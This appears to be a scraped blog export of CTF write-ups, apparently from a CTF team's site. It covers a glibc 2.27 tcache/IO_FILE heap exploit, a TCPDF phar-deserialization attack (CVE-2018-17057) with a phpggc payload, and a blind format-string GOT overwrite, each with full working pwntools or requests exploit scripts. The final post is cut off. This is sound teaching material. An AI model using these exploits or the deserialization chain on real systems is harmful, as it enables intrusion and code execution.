https://drive.google.com/file/d/14ablm3PSKd1q0RDQUt4rZa-FCy7_wCSo/view?usp=sharing nc 47.52.90.3 9999 Info extractingBinary and libc-2.27.so is given, since is 2.27 version we know that tcache is being used and on this version there isn’t any security checks if a chunk is placed in tcache bin. First we start by using the file command: 12$ file warmupwarmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=8b691053c73440b1f889e70408fa631d2a34c6f3, stripped With this we know: ELF compiled for x86_x64 architecture. Dynamically linked. Stripped (A little bit harder to reverse). Next step is to check protections: 1234567checksec warmup[*] '/ctf/work/pwn/warmup/warmup' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Brief analysis of these protections: FULL RELRO (GOT entries are read only we can’t overwrite them) STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to leak it) The Stack is not executable (We can’t execute shellcode, techniques like ROP can bypass this) PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address) Testing the binaryAs always for this kind of challenges we are presented with a menu: 123456789101112131415$ ./warmup Loading......# # # ##### ####### ######### # ## # # # ## # # # # # # ## # # # # # ###### # # # # # ## ## # # # # ## # ##### ##### # #===========================================1.add.2.delete.3.modify.4.exit.&gt;&gt; We can add, delete and modify. By adding we can only specify the content: 123456789101112131415# # # ##### ####### ######### # ## # # # ## # # # # # # ## # # # # # ###### # # # # # ## ## # # # # ## # ##### ##### # #===========================================1.add.2.delete.3.modify.4.exit.&gt;&gt;1content&gt;&gt;hellodone! For delete and edit we can both specify a index in case of modify we can also modify the content we previously added on creation. Static analysis with IDAAnalysis of delete functionAnalysis of add functionAnalysis of edit function ExploitAs you have noticed we don’t have any read/print function that would allow us to print the contents of the created items because of this we need to find another way to leak a libc address, we can do it by manipulation the IO_FILE struct to make puts leaking an address. The plan is: Use tcache dup to overwrite the size of a chunk into a size of unsorted bin range (0x91 for example) Fill the tcachebin size 0x91 by freeing it 7 times (max 7) One more free will put this chunk into an unsorted bin both fd and bk are updated into libc addresses from the main arena. Do a 4 bit brute force by updating the last 2 bytes of the fd libc address to get stdout. Resize from 0x91 back to 0x51 so next free gets into a tcache bin again. Overwrite stdout-&gt;_flags with 0xfbad1800 and _IO_read_ptr, _IO_read_end, _IO_read_base with NULL and the last byte of _IO_write_base with NULL. Extract libc addresses from next puts. Overwrite free_hook with system and modify its fd to /bin/sh\\x00, Doing a free will get a shell for us. Tcache dupLibc-2.27 uses tcache so every allocated chunk bellow 0x410 when freed is placed in a tcachebin , their behaviour will be very similar to when they were inserted in a fastbin chunk before tcache was introduced. The main problem is we can only allocate 0x40 chunks (0x51 -&gt; size + flags) for example if we allocate one item this is how it looks like in the heap: In order to transform the chunk above into a chunk in range of a unsorted bin(unsorted bin because after a free it will update fd bk pointers into libc addresses) we kinda need an arbitrary write. This can be achieved with double free and by changing the fd pointer into a place we want to write, when malloc executes it will return the modified fd pointer in our case we want it to be right at the chunk header (0x5595b74c0660) so we can modify the size from 0x51 to 0x91. Imagine after chunk A we allocate more 2 chunks B and C, if we free B first, free will check if there is any chunk inside tcachebin of size 0x50: As you can see above there isn’t any list of size 0x50 so it will update the fd of the chunk to null. Chunk B before free: Chunk B after free: The pointer to the current freed chunk is inserted into tcachebin(0x50) at the head: If we free chunk C now its fd is updated to chunk B pointer: And the current freed chunk pointer is inserted at the head of tcachebin(0x50): Now if we free Chunk A its fd is going to point to chunk C: Chunks A content pointer is added to the tcachebin(0x50) linked list: If we double free Chunk A its fd is going to point to its own because the previous freed as chunk A: Chunks A content pointer is added to tcachebin(0x50): Notice that ALSR doesn’t modify the last 3 numbers of the pointers of each chunk on the heap: The reason why there is a tcachebin is to reuse space on the heap when a new chunk is allocated, if it’s a perfect fit for example malloc will look at the list of that size and reposition the new allocated chunk on the same places where old chunks were freed. And this is why double freeing is so powerful, since one of the pointers is repeated in the list if we allocate one and modify the last byte of the fd to 0x60 we can make the next malloc to return to the fd we want getting an arbitrary write. So this is how the exploit looks like right now: 1234567891011121314def exploit(): global r r = getConn() if not args.REMOTE and args.GDB: debug([0xBFB,0xD25]) # add BFB free 0xD25 add('A'*0x10) # 0 add('B'*0x30 + p64(0x0)+p64(0x51)) # TO PREVENT double free or corruption (!prev) 1 add('C'*0x30 + p64(0x0)+p64(0x01)) # TO PREVENT corrupted size vs. prev_size 2 free(1) free(2) free(0) free(0) The tcache bin list right now is:10x50 [4]: 0x56018d3ae670 -&gt; 0x56018d3ae670 If we do this mallocs: 12345678# 0x50 [4]: 0x56018d3ae670 -&gt; 0x56018d3ae670add('\\x70') # malloc will return 0x56018d3ae670 and updates last byte of fd to 0x70 | Index 0# 0x50 [3]: 0x56018d3ae670 -&gt; 0x56018d3ae670add('\\x60') # malloc will return 0x56018d3ae670 and updates last byte of fd to 0x60 | Index 1# 0x50 [2]: 0x56018d3ae670 -&gt; 0x56018d3ae660add('\\x60') # malloc will return 0x56018d3ae670 and updates last byte of fd to 0x60 | Index 2# 0x50 [1]: 0x56018d3ae660add(p64(0x0)) # malloc will return 0x56018d3ae660 | Index 3 After this if we edit index 3: 123free(0) # 0x50 [ 1]: 0x56018d3ae670 &lt;- 0x0free(0) # 0x50 [ 2]: 0x56018d3ae670 &lt;- 0x56018d3ae670edit(3, p64(0x0)+p64(0x91)) # modifies the header of chunk A from p64(0x0)+p64(0x51) to p64(0x0)+p64(0x91) The look of chunk A in GDB after edit: Now that we have a 0x91 chunk we need to fill tcachebin of 0x91, we can do this by freeing it 7 times: 12for _ in xrange(7): free(1) The look at tcachebins after this: Next free(1) the chunk is going to be inserted into an unsortedbin: The reason for an unsortedbin is because both fd and bk will be updated into libc addresses: The reasons why I created chunk B and C was to be able to free this chunk, because tcache is full next free will have security checks, on my old write up of penpal world I did the same thing and I explained why chunk B and C bypass this checks you can find it at https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/ The first thing we want to do now is to convert this bin again back to 0x51 size we still have its pointer saved at index 3 so we can easily do it with: 1edit(3, p64(0x0)+p64(0x51)) We want to do this because tcachebin(0x91) is full , we want to manipulate tcachebins again, since we already double freed before at tcachebin(0x50). The other reason is that we can only malloc chunks of size 0x51. Lets compare the difference of stdout address and the address that got placed at the fd . Stdout address:12pwndbg&gt; p/x stdout$3 = 0x7f8421047760 fd pointer at chunk A: 12pwndbg&gt; x/20gx 0x56018d3ae660+0x100x56018d3ae670: 0x00007f8421046ca0 0x00007f8421046ca0 We want to modify 0x7f8421046ca0 to 0x7f8421047760 we only need to change the last 2 bytes, we know that the last 3 numbers of stdout never change(670), they are always the same, so the only thing we need to brute force is the 4th this means if we try to modify the last two bytes of the fd to p16(0x7760) we would have a probability of 1/16 because the only possibilities for last bytes of stdout are: 0760176027603760476057606760776087609760a760b760c760d760e760f760 This is the look of tcachebins right now: So on our second malloc, the pointer returned will be the libc address but before that we need to modify the last 2 bytes from one of the 16 possibilities: 1edit(2, p16(0x7760)) Now if we succeed to bruteforce stdout we need to overwrite stdout-&gt;_flags with 0xfbad1800 and _IO_read_ptr, _IO_read_end, _IO_read_base with NULL and the last byte of _IO_write_base with NULL, if we do this next puts will leak a bunch of libc addresses a more detailed explanation on why this works can be found at https://vigneshsrao.github.io/babytcache/ this guy explains it very well.12345678add('A')try: #context.log_level = 'debug' add(p64(0x0fbad1800)+ 3*p64(0) + '\\x00')except: log.failure(\"not lucky enough!\") r.close() return False if we succeed something like this is printed to the screen where we can see a lot of libc addresses leaked there: Now adapting a bit more our code to make sure we got libc: 1234567891011121314r.recv(0x8)leak = u64(r.recv(6).ljust(8,'\\x00'))LIBC = leak-0x3ed8b0SYSTEM = LIBC + libc.symbols['system']FREE_HOOK = LIBC + libc.symbols[\"__free_hook\"]MALLOC_HOOK = LIBC + libc.symbols[\"__malloc_hook\"]if LIBC &gt;&gt; 40 != 0x7f or LIBC &amp; 0xFFF != 0: log.failure(\"not lucky enough!\") r.close() return Falselog.success(\"0x%x\"%leak)log.success(\"LIBC: 0x%x\" % LIBC)log.success(\"SYSTEM: 0x%x\" % SYSTEM)log.success(\"FREE_HOOK: 0x%x\" % FREE_HOOK) In the end, we have everything we need modify the fd of the object you want to free with /bin/sh and overwrite free_hook with system so next time we trigger free we get a shell! 1234567891011free(0)free(0)free(0)add(p64(0)+p64(0x21)) # 0edit(0,p64(FREE_HOOK))add(p64(0)+p64(0x21)) # 1add(p64(SYSTEM)) # 4 edit(2, \"/bin/sh\\x00\")free(2)r.interactive() Full exploit: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120from pwn import *host, port = \"47.52.90.3\", \"9999\"filename = \"./warmup\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.27.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) #script += \"b * 0x%x\\n\"%(LIBC+) gdb.attach(r,gdbscript=script)def add(content): r.recvuntil('&gt;&gt;') r.sendline('1') r.sendafter('content&gt;&gt;', content)def free(index): r.recvuntil('&gt;&gt;') r.sendline('2') r.sendlineafter('index:', str(index))def edit(index, content): r.recvuntil('&gt;&gt;') r.sendline('3') r.sendlineafter('index:', str(index)) r.sendafter('content&gt;&gt;', content)context.terminal = ['tmux', 'new-window']def exploit(): global r r = getConn() if not args.REMOTE and args.GDB: debug([0xBFB,0xD25]) # add BFB free 0xD25 add('A'*0x10) # 0 add('B'*0x30 + p64(0x0)+p64(0x51)) # TO PREVENT double free or corruption (!prev) 1 add('C'*0x30 + p64(0x0)+p64(0x01)) # TO PREVENT corrupted size vs. prev_size 2 free(1) free(2) free(0) free(0) add('\\x70') # 0 add('\\x60') # 1 add('\\x60') # 2 add(p64(0x0)) # 3 free(0) free(0) edit(3, p64(0x0)+p64(0x91)) for _ in xrange(7): free(1) free(1) #edit(1, p16(0x95dd)) edit(3, p64(0x0)+p64(0x51)) #edit(2, '\\x60\\x07\\xdd')#p16(0xb760)) if args.REMOTE: edit(2, p16(0xb760)) else: edit(2, '\\x60\\x07\\xdd') # echo 0 | sudo tee /proc/sys/kernel/randomize_va_space add('A') try: #context.log_level = 'debug' add(p64(0x0fbad1800)+ 3*p64(0) + '\\x00') except: log.failure(\"not lucky enough!\") r.close() return False r.recv(0x8) leak = u64(r.recv(6).ljust(8,'\\x00')) LIBC = leak-0x3ed8b0 SYSTEM = LIBC + libc.symbols['system'] FREE_HOOK = LIBC + libc.symbols[\"__free_hook\"] MALLOC_HOOK = LIBC + libc.symbols[\"__malloc_hook\"] if LIBC &gt;&gt; 40 != 0x7f or LIBC &amp; 0xFFF != 0: log.failure(\"not lucky enough!\") r.close() return False log.success(\"0x%x\"%leak) log.success(\"LIBC: 0x%x\" % LIBC) log.success(\"SYSTEM: 0x%x\" % SYSTEM) log.success(\"FREE_HOOK: 0x%x\" % FREE_HOOK) free(0) free(0) free(0) add(p64(0)+p64(0x21)) # 0 edit(0,p64(FREE_HOOK)) add(p64(0)+p64(0x21)) # 1 add(p64(SYSTEM)) # 4 edit(2, \"/bin/sh\\x00\") free(2) r.interactive() print '-------------------------------------------------------------------------' r.close() return Truewhile not exploit(): pass Running it","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"IO_FILE","slug":"Pwn/x64/Glibc-Malloc/IO-FILE","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"},{"name":"Tcache","slug":"Pwn/x64/Glibc-Malloc/Tcache","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"},{"name":"tcache_dup","slug":"Pwn/x64/Glibc-Malloc/Tcache/tcache-dup","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"}],"tags":[{"name":"io_file","slug":"io-file","permalink":"https://teamrocketist.github.io/tags/io-file/"},{"name":"io_file_struct","slug":"io-file-struct","permalink":"https://teamrocketist.github.io/tags/io-file-struct/"},{"name":"double_free","slug":"double-free","permalink":"https://teamrocketist.github.io/tags/double-free/"},{"name":"heap","slug":"heap","permalink":"https://teamrocketist.github.io/tags/heap/"},{"name":"n1ctf2019","slug":"n1ctf2019","permalink":"https://teamrocketist.github.io/tags/n1ctf2019/"}]},{"title":"[Web] Chaos Communication Camp 2019 CTF - pdfcreator","slug":"Web-Chaos-Communication-Camp-2019-CTF-pdfcreator","date":"2019-08-25T09:54:28.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/","link":"","permalink":"https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/","excerpt":"","text":"Description:116 Written by: 0x4d5a A pdf conversion service. What could go wrong? hax.allesctf.net:3333 code.zip IntroductionA website that converts editable content into a pdf, it uses a known tool named tcpdf , since the source code is given lets check its version at TCPDF/tcpdf.php 1234567891011$ cat pdfcreator/TCPDF/tcpdf.php | head -10&lt;?php//============================================================+// File name : tcpdf.php// Version : 6.2.13// Begin : 2002-08-03// Last Update : 2015-06-18// Author : Nicola Asuni - Tecnick.com LTD - www.tecnick.com - info@tecnick.com// License : GNU-LGPL v3 (http://www.gnu.org/copyleft/lesser.html)// -------------------------------------------------------------------// Copyright (C) 2002-2015 Nicola Asuni - Tecnick.com LTD The version is 6.2.13 searching online for known vulnerabilities https://www.cvedetails.com/cve/CVE-2018-17057/ : 12An issue was discovered in TCPDF before 6.2.22. Attackers can trigger unserialization of arbitrary data via the phar:// wrapper. So it’s possible possible to perform an unserialization attack using phar://wrapper wrappers, the deserialization is triggered on functions like file_exists (line 164), getimagesize() (line 171) and file_get_contents() (line 209) in the file pdfcreator/TCPDF/include/tcpdf_images.php: 1234567891011.... // pdfcreator/TCPDF/include/tcpdf_images.phppublic static function _parsejpeg($file) &#123; // check if is a local file if (!@file_exists($file)) &#123; // try to encode spaces on filename $tfile = str_replace(' ', '%20', $file); if (@file_exists($tfile)) &#123; $ file = $tfile; &#125; &#125;.... This unserialization only occurs when using phar:// wrappers, but we can’t straightly upload a phar file because of the checks presented in index.php 12345678910111213141516171819.... // pdfcreator/index.php $allowed_extensions = array('png', 'jpg', 'jpeg', 'gif'); if(!in_array($extension, $allowed_extensions)) &#123; die(\"&lt;div class=\\\"container\\\"&gt;Invalid image extension!&lt;/div&gt;\"); return; &#125;.... //Überprüfung dass das Bild keine Fehler enthält if(function_exists('exif_imagetype')) &#123; //Die exif_imagetype-Funktion erfordert die exif-Erweiterung auf dem Server $allowed_types = array(IMAGETYPE_PNG, IMAGETYPE_JPEG, IMAGETYPE_GIF); $detected_type = exif_imagetype($_FILES['file']['tmp_name']); if(!in_array($detected_type, $allowed_types)) &#123; echo(\"&lt;div class=\\\"container\\\"&gt;Only pictures allowed!&lt;/div&gt;\"); return; &#125; &#125;.... This checks can be easily bypassed, the first check can easily bypassed by changing filename from exploit.phar to exploit.jpg. The second check only checks the header we can easily append to our phar file a jpg header before our phar file. The objective is to unserialize a php class that can gives us RCE or a fileread of file flag.php, there is a good class we can use for this: 12345678910111213141516171819202122232425262728293031// pdfcreator/creator.php&lt;?phpnamespace PDFStuff&#123;include 'TCPDF/tcpdf.php';class PDFCreator&#123; public $tmpfile; public $finalfile; function __construct() &#123; &#125; ... function __destruct() &#123; if (file_exists($this-&gt;tmpfile)) &#123; $info = pathinfo($this-&gt;tmpfile); if ($info['extension'] == \"pdf\") &#123; unlink($this-&gt;tmpfile); &#125; else &#123; echo \"Could not delete created PDF: Not a pdf. Check the file: \" . file_get_contents($this-&gt;tmpfile); &#125; &#125; &#125; ExploitWe want to trigger functions like __construct or __destruct after object deserialization, __construct is empty so it’s not useful but __destruct is! It can give us a file_read which is enough for what we need, but for this we need to change tmpfile variable to ./flag.php making the extesion to be diferent from pdf reading the file content instead. I tried to manually create the phar file but failed miserly, while debugging locally with I was having some troubles passing through the function getimagesize due to some errors on jpg signatures eventually I managed to solve the problem but in the end the function __destruct was not triggering and I ended up giving up. Eventually I found phpggc which can create for us the fake jpg file with the phar embed on it, we just need to create our own template for this: 1234$ git clone https://github.com/ambionics/phpggc$ cd phpggc$ mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1$ cp templates/* gadgetchains/Alles/FR/1/* Modifying the chain.php at gadgetchains/Alles/FR/1/: 1234567891011121314151617&lt;?phpnamespace PDFStuff &#123; class PDFCreator &#123; public $tmpfile; &#125;&#125;namespace GadgetChain\\Alles &#123; class FR1 extends \\PHPGGC\\GadgetChain\\FileRead &#123; public static $version = '1.00'; public static $vector = '__destruct'; public static $author = 'teamrocketist'; public function generate(array $parameters) &#123; $a = new \\PDFStuff\\PDFCreator(); $a-&gt;tmpfile = $parameters[\"remote_file\"]; // file to read return $a; &#125; &#125;&#125; Generating the payload with phpggc:1./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg The option -f uses a technique named fast destructor to make sure the object deserialized triggers __destruct, option -pj is to create a jpeg-phar from sample dummy.jpg(any valid jpg works) the one I used was this one, -o option is to specify the output of the payload to a file location. After uploading the file make sure you modify the img html tag to use phar:// wrappers: 1&lt;img src=\"phar://./upload/708697c63f7eb369319c6523380bdf7a_6.jpg\" width=\"10\" height=\"10\"&gt; Finally writing a python script to automate this actions: 123456789import requestsimport refiles = &#123;'file': open('exploit.jpg','rb')&#125;url = 'http://hax.allesctf.net:3333/index.php'values = &#123;\"filename\":\"exploit.jpg\", \"Content-Disposition\":\"form-data\", \"Content-Type\":\"image/jpeg\"&#125;r = requests.post(url, files=files, data=values)file_link = re.findall(r'src=\"(.*)\"',r.text)[0]img = '&lt;img src=\"phar://./%s\" width=\"10\" height=\"10\"&gt;'print re.findall(r'ALLES&#123;.*&#125;', requests.post(url, data=&#123;'pdfcontent':img%file_link&#125;).text)[0] Running and getting the flag: 12$ python webPwn.pyALLES&#123;phar_jpeg_polyglot_madness_such_w0w&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"ccc2019ctf","slug":"ccc2019ctf","permalink":"https://teamrocketist.github.io/tags/ccc2019ctf/"},{"name":"unserialization","slug":"unserialization","permalink":"https://teamrocketist.github.io/tags/unserialization/"},{"name":"php","slug":"php","permalink":"https://teamrocketist.github.io/tags/php/"}]},{"title":"[Pwn] RedpwnCTF - Black Echo","slug":"Pwn-RedpwnCTF-Black-Echo","date":"2019-08-17T05:12:40.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/08/17/Pwn-RedpwnCTF-Black-Echo/","link":"","permalink":"https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-Black-Echo/","excerpt":"","text":"Black Echo Description:413 Written by: blevy You are trapped in a pitch-black cave with no food, water, flashlight, or self-esteem. A faint echo can be heard in the distance. nc chall2.2019.redpwn.net 4007 IntroductionNo binary was provided in this challenge, but it was easy to note that there was a format string vulnerability: 123$ nc chall2.2019.redpwn.net 4007%p0x1000 Without the binary we can’t get the got addresses required to leak libc, but we can get the binary from memory, I used an old x86 binary from a previous challenge to check what was the default address: 1234567891011121314151617181920pwndbg&gt; info proc mappings process 26806Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0x0 /ctf/redpwn/hardmode/hardmode 0x8049000 0x804a000 0x1000 0x0 /ctf/redpwn/hardmode/hardmode 0x804a000 0x804b000 0x1000 0x1000 /ctf/redpwn/hardmode/hardmode 0xf7db4000 0xf7f8b000 0x1d7000 0x0 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8b000 0xf7f8c000 0x1000 0x1d7000 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8c000 0xf7f8e000 0x2000 0x1d7000 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8e000 0xf7f8f000 0x1000 0x1d9000 /lib/i386-linux-gnu/libc-2.28.so 0xf7f8f000 0xf7f92000 0x3000 0x0 0xf7fcd000 0xf7fcf000 0x2000 0x0 0xf7fcf000 0xf7fd2000 0x3000 0x0 [vvar] 0xf7fd2000 0xf7fd4000 0x2000 0x0 [vdso] 0xf7fd4000 0xf7ffb000 0x27000 0x0 /lib/i386-linux-gnu/ld-2.28.so 0xf7ffc000 0xf7ffd000 0x1000 0x27000 /lib/i386-linux-gnu/ld-2.28.so 0xf7ffd000 0xf7ffe000 0x1000 0x28000 /lib/i386-linux-gnu/ld-2.28.so 0xfffdd000 0xffffe000 0x21000 0x0 [stack] We can start leaking from 0x8049000 until 0x804b000, the starting of 0x8048000-0x8049000 is just a repetition from 0x8049000-0x804a000, there is also something you should worry about, addresses that contains 0x0a (new line ‘\\n’) bytes can’t be leaked, because the function used to read is fgets and it stops reading when it encounters new lines, in this cases I just insert a null byte, in the end is expected the binary to be slightly corrupted. If you want more details liveoverflow did a video about an identical challenge on his youtube channel around 2017 you can visit at https://www.youtube.com/watch?v=XuzuFUGuQv0 The code to leak the binary:123456789101112131415161718192021222324252627282930binary = ''out = ''x=0x8049000while x &lt; 0x8049000+0x2000: address = \"0%x\" % x length = 0 print address if ('\\n' in binascii.unhexlify(address)): #length = 1 out = 'a' binary += '\\x00' else: r.sendline(\"%9$s\"+\"||||\"+p32(x)) out = r.recvuntil('||||') print out r.recv(timeout=1) print '-----' out = out.replace('||||','') #print out #length = count_until(out) if out == '': out = 'a' binary += '\\x00' else: binary += out with open('gotcha2.elf','wb+') as f: f.write(binary) x += len(out) They binary is somehow corrupted as expected but it’s still possible to deduce which libc addresses are in there, as you can see in the picture above, right above extern functions you have some libc addresses, they look like they are from the GOT, with some trial and error I manged to which they belong by using libc-database (https://github.com/niklasb/libc-database). First trying o find fgets: 12345678./find fgets 0xF7FCD918$ ./find fgets 0xF7FBDFE0$ ./find fgets 0xF7E54450$ ./find fgets 0xF7E38020$ ./find fgets 0xF7E4C620ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64) libc ID is libc6-i386_2.23-0ubuntu10_amd64, we now know which libc is and fgets got address is 0x804A014: Doing the same thing for printf you would end up finding the same: 12345./find printf 0xF7E38020archive-old-eglibc (id libc6-i386_2.11.1-0ubuntu7.11_amd64)ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64) Printf got address is 0x804a010: Now it’s a matter of leaking libc by leaking fgets from GOT and overwriting got address of printf into system with format string: 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *import timeimport binasciilibc = ELF('libc.so.6')host,port = 'chall.2019.redpwn.net','4007'r = remote(host,port)FGETS_GOT = 0x804A014PRINTF_GOT = 0x804A010r.sendline(\"%8$s\"+p32(PRINTF_GOT))PRINTF = u32(r.recv(4))LIBC_BASE = PRINTF - libc.symbols['printf']SYSTEM = LIBC_BASE + libc.symbols['system']FGETS = LIBC_BASE + libc.symbols['fgets']GETS = LIBC_BASE + libc.symbols['gets']PUTS = LIBC_BASE + libc.symbols['puts']log.info(\"LIBCBASE 0x%x\"%LIBC_BASE)log.info(\"PRINTF 0x%x\"%PRINTF)log.info(\"SYSTEM 0x%x\"%SYSTEM)log.info(\"FGETS 0x%x\"%FGETS)log.info(\"STDOUT 0x%x\"%(LIBC_BASE+libc.symbols['stdout']))log.info(\"STDIN 0x%x\"%(LIBC_BASE+libc.symbols['stdin']))log.info(\"SETBUFF 0x%x\"%(LIBC_BASE+libc.symbols['setbuf']))log.info(\"STDERR 0x%x\"%(LIBC_BASE+libc.symbols['stderr']))log.info(\"PUTS 0x%x\"%(LIBC_BASE+libc.symbols['puts']))#SYSTEM = 0xcafebabeFLAG_LOW = SYSTEM &amp; 0xffffFLAG_HIGH = (SYSTEM &amp; 0xffff0000) &gt;&gt; 16s = ''s += p32(PRINTF_GOT)s += p32(PRINTF_GOT+2)s += '%7$ln' # clears the already existing got addresss += '%&#123;&#125;x%7$hn'.format(FLAG_LOW-0x8)s += '%&#123;&#125;x%8$hn'.format(FLAG_HIGH-FLAG_LOW)r.sendline(s)r.recv()r.sendline(\"/bin/sh\\x00\")r.interactive() Running it: 12345678910111213141516171819202122$ python blackecho.py [*] '/ctf/work/blackecho/libc.so.6' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to chall2.2019.redpwn.net on port 4007: Done[*] LIBCBASE 0xf7dec000[*] PRINTF 0xf7e35020[*] SYSTEM 0xf7e26940[*] FGETS 0xf7e49620[*] STDOUT 0xf7f9cdfc[*] STDIN 0xf7f9ce00[*] SETBUFF 0xf7e51450[*] STDERR 0xf7f9cdf8[*] PUTS 0xf7e4b140[*] Switching to interactive mode\\x10\\xa0\\x0\\x12\\xa0\\x0...truncated...$ cat flag.txtflag&#123;__xXxxXx__w3lc0me_t0_th3_surf4c3__xXxxXx__&#125; The flag was flag{xXxxXxw3lc0me_t0_th3_surf4c3__xXxxXx__}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Format String","slug":"Pwn/x86/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Format-String/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"redpwnctf2017","slug":"redpwnctf2017","permalink":"https://teamrocketist.github.io/tags/redpwnctf2017/"}]},{"title":"[Pwn] RedpwnCTF - penpal world","slug":"Pwn-RedpwnCTF-penpal-world","date":"2019-08-17T03:16:39.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/08/17/Pwn-RedpwnCTF-penpal-world/","link":"","permalink":"https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/","excerpt":"","text":"penpal world Description:436 Written by: jespiron Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~ nc chall2.2019.redpwn.net 4010penpal_worldlibc-2.27.so IntroductionFrom the challenge is provided its binary and libc.Lets first extract some information: 12$ file penpal_worldpenpal_world: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=195416fc8622b4f9906da0915a9abb1dfde40e13, not stripped With file command we now know: ELF compiled for x86_x64 architecture. Dynamically linked. Not stripped. Let’s check the enabled protections with checksec: 1234567$ checksec penpal_world[*] '/ctf/redpwn/pwn/pepal_world/penpal_world' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Protections: FULL RELRO (GOT entries are read only we can’t overwrite them) STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to leak it) The Stack is not executable (We can’t execute shellcode techniques like ROP can bypass this) PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address) Running the binaryLets first run the binary to see how it works We are presented with a menu where we can create,edit,discard and read a postcard:123456$ ./penpal_worldOPTIONS1) Create a postcard2) Edit a postcard3) Discard a postcard4) Read a postcard Analysing the binary for a vulnerabilityUsing ida to check on the main loop: Lets check create_card:edit_card time:The vulnerability is in discard_card:display function doesn’t have anything special it does control the indexes and you can print the cards as well. ExploitFirst we need to check which libc version is used on the server, since we are provided with the libc file from the challenge, we know that it’s using libc-2.27 since version 2.26 it implements the tcache concept that is used to cache free chunks in the heap before adding them to the libc freelist. Now all heap chunks of size &lt; 0x410 are treated as tcache chunks. When freed they go into their respective tcache bins. The good thing about this unlike normal chunks and luckly in this libc version there is no security checks making it easier to exploit. Thus we can double free and malloc without any size checks. The exploit plan is the following one: Leak the heap address by reading the fd pointer after freeing; Find a way to overwrite the size of a chunk to 0x91 (so when we free it it goes to unsorted bin instead); Fill the tcache unsorted tcache bin list (max 7); After tcache unsorted bin is full the next free will put into a normal unsorted bin with that we can leak libc; Tricking malloc() into returning the address of __malloc_hook ; Overwrite __malloc_hook with the address of a one gadget ; Trigger the hook using malloc()! Setting up the environment for pwn ctf challengesNow there is a small problem, if you want to debug the binary with the right libc version you either find the right linux docker container that uses that version that libc as default or you LD_PRELOAD it, to do it you need to compile that specific version. for example to do this manually: 123cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.sopatchelf --set-interpreter /tmp/ld-2.27.so ./testLD_PRELOAD=./libc.so.6 ./test Or using pwntools 12from pwn import *p = process([\"/path/to/ld.so\", \"./test\"], env=&#123;\"LD_PRELOAD\":\"/path/to/libc.so.6\"&#125;) Luckily someone did the dirty work for us, this docker container contains multiple compiled libcs and also the default libc coming with the system is libc-2.27.so 